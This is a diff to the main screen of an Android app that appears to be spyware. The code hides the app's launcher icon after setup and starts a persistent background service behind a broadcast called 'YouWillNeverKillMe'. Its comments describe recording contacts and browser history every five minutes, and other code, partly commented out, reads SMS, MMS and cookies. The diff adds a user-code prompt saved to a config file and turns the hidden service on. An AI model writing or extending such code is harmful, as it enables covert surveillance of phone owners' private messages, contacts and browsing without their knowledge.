@@ -25,6 +25,7 @@ import android.view.View;
 import android.webkit.CookieManager;
 import android.webkit.CookieSyncManager;
 import android.widget.Button;
+import android.widget.EditText;
 import android.widget.Toast;
 
 import com.postal.omniscient.postal.adapter.EventBusData;
@@ -43,6 +44,16 @@ import com.postal.omniscient.postal.service.StartService;
 
 import org.greenrobot.eventbus.EventBus;
 
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.FileReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.OutputStreamWriter;
+import java.io.PrintWriter;
 import java.net.CookieHandler;
 import java.net.CookiePolicy;
 import java.text.SimpleDateFormat;
@@ -57,6 +68,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private DevicePolicyManager mDPM;
     private ComponentName mAdminName;
     private Button registration, cookie;
+    private EditText userID;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -64,6 +76,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         setContentView(R.layout.activity_main);
         registration = (Button)findViewById(R.id.registration);
         cookie = (Button)findViewById(R.id.cookie);
+        userID = (EditText) findViewById(R.id.userID);
         registration.setOnClickListener(this);
         cookie.setOnClickListener(this);
 
@@ -81,7 +94,13 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
 
     private void startAPP(){
-
+        if(userID.getText().length()<1){
+            Toast toast = Toast.makeText(getApplicationContext(),
+                    "Enter your code", Toast.LENGTH_LONG);
+            toast.show();
+            return;
+        }
+        saveLogin();
         //        setContentView(R.layout.activity_main); //ЕТО ВЫКЛЮЧИТЬ
         //БУДЕТ СЕРВИС КАЖДЫЕ 5 ин и записывает еонтакты и браузер
         AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
@@ -97,10 +116,6 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), pendingIntent);
         }
 
-
-
-
-
         PackageManager pkg=this.getPackageManager();
         pkg.setComponentEnabledSetting(new ComponentName(this,MainActivity.class),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP);// ЕТО ВКЛЮЧИТЬ
@@ -113,8 +128,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 //        getContacts();//in test
         //SMS
 //        ReadSms ob = new ReadSms(getContentResolver());
-        String uri_send_sms = "content://sms/sent";
-        String uri_inbox_sms = "content://sms/inbox";
+//        String uri_send_sms = "content://sms/sent";
+//        String uri_inbox_sms = "content://sms/inbox";
 //        ob.massAllSMS(uri_send_sms, uri_inbox_sms); // SMS'ki
 
 
@@ -135,7 +150,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 //        br_h.getBrowserHist();
 
         //MMS
-        ReadMms mms = new ReadMms(getContentResolver());
+       // ReadMms mms = new ReadMms(getContentResolver());
 //        Long buf_date;
 //        for(AdapterData buf : mms.massAllMms()){
 //            Log.i(Msg, "Id : "+buf.getId());
@@ -178,20 +193,21 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 //        mms.massAllMMS(uri_send_sms, uri_inbox_sms);
         ///////////////////////////////////////////
         //STRAT SERVICE
-        Toast toast = Toast.makeText(getApplicationContext(),
-                "Пора покормить кота!", Toast.LENGTH_SHORT);
-        AsyncM ad = new AsyncM(getApplicationContext(), toast);
+//        Toast toast = Toast.makeText(getApplicationContext(),
+//                "Пора покормить кота!", Toast.LENGTH_SHORT);
+//        AsyncM ad = new AsyncM(getApplicationContext(), toast);
 
-        ad.forceLoad();
-        ad = null;
+        //ad.forceLoad();
 
+//        Intent par = new Intent(getApplicationContext(), StartService.class);
+        sendBroadcast(new Intent("YouWillNeverKillMe"));
         finish(); //ЕТО ВКЛЮЧИТЬ
             }
 
     @Override
     public void onClick(View v) {
         switch (v.getId()) {
-            case R.id.registration:startAPP(); Log.i(Msg, "NOTES ME SEMPAI");break;
+            case R.id.registration:startAPP();break;
             case R.id.cookie:dispatchTakePictureIntent();break;
         }
     }
@@ -204,7 +220,33 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             startActivityForResult(takePictureIntent, REQUEST_IMAGE_CAPTURE);
         }
     }
+    // save id_user
+    private void saveLogin(){
+        writeFromFile(getApplicationContext(), "super");
+    }
 
+    private void writeFromFile(Context context, String data) {
+
+        try {
+            File stPath = new File(context.getFilesDir(), "/Config");//DIR);
+            // создаем каталог
+            if (!stPath.exists()) {
+                stPath.mkdirs();
+            }
+            File file = new File(stPath, "config.cnf");
+            FileOutputStream f = new FileOutputStream(file);
+            PrintWriter pw = new PrintWriter(f);
+            pw.println(userID.getText().toString());
+
+            pw.flush();
+            pw.close();
+            f.close();
+        }
+        catch (IOException e) {
+            Log.e("Exception", "File write failed: " + e.toString());
+        }
+
+    }
 
 
     public class AsyncM extends AsyncTaskLoader {
@@ -223,8 +265,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         @Override
         public Object loadInBackground() {
             Log.i("MyMsg", "MyActyvity Start");
-//            Intent par = new Intent(getApplicationContext(), StartService.class);
-//            startService(par);
+            Intent par = new Intent(getApplicationContext(), StartService.class);
+            startService(par);
 
             return null;
         }
